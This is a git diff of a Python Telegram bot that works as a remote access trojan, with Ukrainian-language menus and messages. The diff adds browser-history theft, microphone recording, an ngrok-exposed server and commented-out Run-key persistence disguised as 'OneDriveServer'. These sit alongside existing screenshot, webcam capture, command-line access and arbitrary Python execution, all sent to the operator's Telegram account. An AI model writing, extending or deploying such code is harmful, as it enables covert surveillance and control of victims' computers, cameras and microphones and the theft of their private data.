@@ -1,14 +1,32 @@
 import telebot
-import cv2
 from telebot import types
+
+
+import cv2
 from PIL import ImageGrab
 import os
+from browser_history import get_history
+import pyaudio
+import wave
+
 import time
 import pyautogui
+
+#import winreg
+# Путь к папке со скриптом
+#script_path = os.path.abspath("main.py")
+# Открываем ключ реестра
+#key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
+# Добавляем значение в ключ реестра
+#winreg.SetValueEx(key, "OneDriveServer", 0, winreg.REG_SZ, script_path)
+# Закрываем ключ реестра
+#winreg.CloseKey(key)
+
 
 bot = telebot.TeleBot("TOKEN")
 ID: int = #YOR TG ID
 
+bot.send_message(ID, "🟢ОНЛАЙН🟢")
 
 @bot.message_handler(commands=['start', 'help'])
 def start(message):
@@ -17,15 +35,18 @@ def start(message):
         btn1 = types.KeyboardButton("Отримати скріншот екрану")
         btn2 = types.KeyboardButton("Відкрити командний рядок")
         btn3 = types.KeyboardButton("Команди pyautogui")
-        btn4 = types.KeyboardButton("Запустити код")
+        btn4 = types.KeyboardButton("Запустити пайтон код")
         btn5 = types.KeyboardButton("Отримати фото з камери")
         btn6 = types.KeyboardButton("Отримати данні комп'ютера")
-        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
+        btn7 = types.KeyboardButton("Отримати історію браузера")
+        btn8 = types.KeyboardButton("Отримати звук з мікрофона")
+        btn9 = types.KeyboardButton("Онлайн сервер")
+        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9)
         bot.send_message(ID,
-                         text="Привіт {0.first_name}! Я тестовий бот".format(
+                         text="Привіт {0.first_name}! Я приватний бот удаленного доступа".format(
                              message.from_user), reply_markup=markup)
 
-@bot.message_handler(content_types=['text', 'image'])
+@bot.message_handler(content_types=['text', 'image', 'document'])
 def func(message):
     if message.chat.id == ID:
 
@@ -38,13 +59,35 @@ def func(message):
 
 ###########################################################################
 
+        elif (message.text == "Отримати історію браузера"):
+            outputs = get_history()
+            outputs.save("C:\Windows\Temp\history.json")
+            his = open('C:\Windows\Temp\history.json', 'rb')
+            bot.send_message(ID, "Історія браузера для мелкого шалунишки")
+            bot.send_document(ID, his)
+            his.close()
+            os.remove("C:\Windows\Temp\history.json")
+
+###########################################################################
+
+        elif (message.text == "Отримати звук з мікрофона"):
+            reply_record = types.InlineKeyboardMarkup(row_width=1)
+            back1 = types.InlineKeyboardButton("Скасування", callback_data="back1")
+            reply_record.add(back1)
+            send_message = bot.send_message(ID, "Введіть скільки секунд записувати",
+                                            reply_markup=reply_record)
+            bot.register_next_step_handler(send_message, record)
+
+
+###########################################################################
+
         elif message.text == "Отримати фото з камери":
             cap = cv2.VideoCapture(0)
             for i in range(30):
                 cap.read()
             ret, image = cap.read()
             path = 'C:\Windows\Temp'
-            cv2.imwrite(os.path.join(path , 'cam.jpg'), image)
+            cv2.imwrite(os.path.join(path, 'cam.jpg'), image)
             cap.release()
             photo = open('C:\Windows\Temp\cam.jpg', 'rb')
             bot.send_message(ID, "Знімок з камери")
@@ -125,13 +168,21 @@ def func(message):
 ###########################################################################
 
         elif message.text == "Отримати данні комп'ютера":
-            bot.send_message(ID, text="Ща брат 5 сек".format(message.from_user))
+            bot.send_message(ID, text="Зачекайте будь-ласка пару секунд збираю данні для відправки".format(message.from_user))
             os.system("python pc_information.py")
             time.sleep(5)
-            doc = open("C:\Windows\Temp/info.txt", "rb")
+            doc = open("C:\Windows\Temp\info.txt", "rb")
             bot.send_document(ID, doc)
             doc.close()
             os.remove("C:\Windows\Temp\info.txt")
+
+###########################################################################
+
+        elif message.text == "Онлайн сервер":
+            bot.send_message(ID, "Зачекайте будь-ласка пару секунд, запускаю сервер")
+            from serv import ngrok_url
+            bot.send_message(ID, ngrok_url)
+
 
 ###########################################################################
 
@@ -229,4 +280,62 @@ def start_code(message):
     else:
         func(message)
 
+def record(message):
+    if message.text == "Скасування":
+        start(message)
+    else:
+        try:
+            RECORD_SECONDS = int(message.text)
+            CHUNK = 1024
+            FORMAT = pyaudio.paInt16
+            CHANNELS = 2
+            RATE = 44100
+            WAVE_OUTPUT_FILENAME = "C:\Windows\Temp/0.wav"
+
+            p = pyaudio.PyAudio()
+
+
+
+            stream = p.open(
+                            format=FORMAT,
+                            channels=CHANNELS,
+                            rate=RATE,
+                            input=True,
+                            frames_per_buffer=CHUNK
+                            )
+
+            bot.send_message(ID, "Записую")
+            print("* recording")
+
+            frames = []
+
+            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+                data = stream.read(CHUNK)
+                frames.append(data)
+
+            bot.send_message(ID, "Записав")
+            print("* done recording")
+
+            stream.stop_stream()
+            stream.close()
+            p.terminate()
+
+            wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
+            wf.setnchannels(CHANNELS)
+            wf.setsampwidth(p.get_sample_size(FORMAT))
+            wf.setframerate(RATE)
+            wf.writeframes(b''.join(frames))
+            wf.close()
+            bot.send_message(ID, "Відправляю")
+            rec = open("C:\Windows\Temp/0.wav", "rb")
+            bot.send_document(ID, rec)
+            rec.close()
+            os.remove("C:\Windows\Temp/0.wav")
+        except:
+            bot.send_message(ID, "Помилка увведіть тільки число")
+            message.text = "Отримати звук з мікрофона"
+            func(message)
+
+
 bot.polling(none_stop=True)
+bot.send_message(ID, "🔴ОФЛАЙН🔴")
